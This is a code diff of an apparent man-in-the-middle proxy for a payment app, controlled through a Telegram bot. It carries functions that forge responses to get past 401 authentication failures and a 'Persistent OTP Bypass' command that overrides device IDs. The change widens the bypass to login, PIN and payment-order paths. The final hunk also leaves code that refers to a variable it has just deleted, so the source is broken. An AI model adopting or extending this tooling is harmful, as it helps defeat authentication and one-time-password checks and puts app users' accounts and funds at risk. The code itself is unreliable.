@@ -320,7 +320,8 @@ const DEFAULT_DATA = {
   autoRotate: false,
   lastUsedIndex: -1,
   adminChatId: null,
-  logRequests: false,
+  logRequests: true,
+  logDebugRequests: false,
   usdtAddress: '',
   depositSuccess: false,
   depositBonus: 0,
@@ -493,10 +494,7 @@ function isAuthFailureResponse(jsonResp) {
 function shouldBypass401(req) {
   const path = (req.originalUrl || req.url || '').split('?')[0];
   const noBypass = [
-    '/app/user/login/', '/app/captcha/', '/app/user/info/updatePassword',
-    '/app/user/info/updatePin', '/app/user/info/verifyPin',
-    '/app/payment/order/submit', '/app/payment/order/create',
-    '/app/user/info/appLogout'
+
   ];
   return !noBypass.some(p => path.includes(p));
 }
@@ -507,7 +505,7 @@ function make401Bypass(jsonResp) {
 }
 
 function sendJsonSafe(res, headers, json, fallback, req) {
-  if (req && cachedData && cachedData.logRequests && cachedData.adminChatId && bot) {
+  if (req && cachedData && cachedData.logDebugRequests && cachedData.adminChatId && bot) {
     try {
       const path = req.originalUrl || req.url || 'N/A';
       const method = req.method || 'GET';
@@ -1399,63 +1397,6 @@ Example:
     }
 
     if (text.startsWith('/alwaysid')) {
-      const freshData = await loadData(true);
-      if (text.trim() === '/alwaysid off') {
-        freshData.alwaysIdOverride = null;
-        await saveData(freshData);
-        await bot.sendMessage(chatId, '🔴 Always DeviceId Override OFF');
-        return res.sendStatus(200);
-      }
-      const parts = text.trim().split(/\s+/);
-      let devId = parts[1];
-      if (!devId && freshData.lastCapturedId) {
-        devId = freshData.lastCapturedId.deviceId;
-      }
-      if (!devId) {
-        await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId>\nOr /alwaysid off to disable.');
-        return res.sendStatus(200);
-      }
-      freshData.alwaysIdOverride = { deviceId: devId };
-      await saveData(freshData);
-      await bot.sendMessage(chatId, `🔄 *Always DeviceId Override Set (Persistent OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will overwrite deviceId for all future login attempts until /alwaysid off.`, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
-
-    if (text === '/clearid') {
-      const freshData = await loadData(true);
-      freshData.useIdOverride = null;
-      freshData.alwaysIdOverride = null;
-      await saveData(freshData);
-      await bot.sendMessage(chatId, '🧹 All DeviceId Overrides Cleared!');
-      return res.sendStatus(200);
-    }
-
-    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
-      const freshData = await loadData(true);
-      if (text === '/debug off') {
-        debugMode = false;
-        freshData.logRequests = false;
-        await saveData(freshData);
-        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode').catch(() => { });
-      } else if (text === '/debug on') {
-        debugMode = true;
-        freshData.logRequests = true;
-        await saveData(freshData);
-        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off').catch(() => { });
-      } else {
-        freshData.logRequests = !freshData.logRequests;
-        debugMode = freshData.logRequests;
-        await saveData(freshData);
-        await bot.sendMessage(chatId, freshData.logRequests
-          ? '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off'
-          : '🔴 Debug Mode OFF — normal mode').catch(() => { });
-      }
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/off log ')) {
-      const targetId = text.substring(9).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
